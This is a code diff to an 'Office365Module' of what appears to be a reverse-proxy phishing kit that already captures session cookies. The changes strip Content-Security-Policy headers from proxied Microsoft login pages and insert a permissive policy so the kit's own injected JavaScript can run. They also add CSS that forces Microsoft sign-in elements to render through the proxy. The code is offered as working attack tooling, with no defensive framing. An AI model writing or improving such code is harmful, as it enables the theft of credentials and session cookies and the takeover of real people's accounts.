@@ -888,11 +888,16 @@ class Office365Module(BaseModule):
             if captured_cookies:
                 self._handle_captured_cookies(captured_cookies)
             
-            # Prepare response headers
+            # Prepare response headers and remove CSP restrictions
             response_headers = {}
             for key, value in resp.headers.items():
-                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection']:
+                if key.lower() not in ['content-encoding', 'content-length', 'transfer-encoding', 'connection', 
+                                     'content-security-policy', 'content-security-policy-report-only', 
+                                     'x-content-security-policy', 'x-webkit-csp']:
                     response_headers[key] = value
+            
+            # Add permissive CSP to allow our custom JavaScript
+            response_headers['Content-Security-Policy'] = "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: *;"
             
             # Handle redirects properly by rewriting Location headers
             if 'Location' in response_headers:
@@ -1009,6 +1014,23 @@ class Office365Module(BaseModule):
 /* Ensure the page displays properly without JavaScript */
 [style*="display: none"], [style*="display:none"] { display: block !important; }
 .hidden { display: block !important; }
+.d-none { display: block !important; }
+.visually-hidden { display: block !important; }
+
+/* Force visibility of common Microsoft login elements */
+.login-container, .login-box, .login-form, .form-container,
+#lightbox, #loginForm, .login-paginated-page, .pagination-view,
+.tile-container, .sign-in-box, .content, .main-content { 
+    display: block !important; 
+    visibility: visible !important;
+    opacity: 1 !important;
+}
+
+/* Ensure body and html are visible */
+html, body { 
+    background-color: #f5f5f5 !important; 
+    min-height: 100vh !important;
+}
 </style>
 <script>
 // Minimal safe JavaScript for basic form functionality (no domain checks)
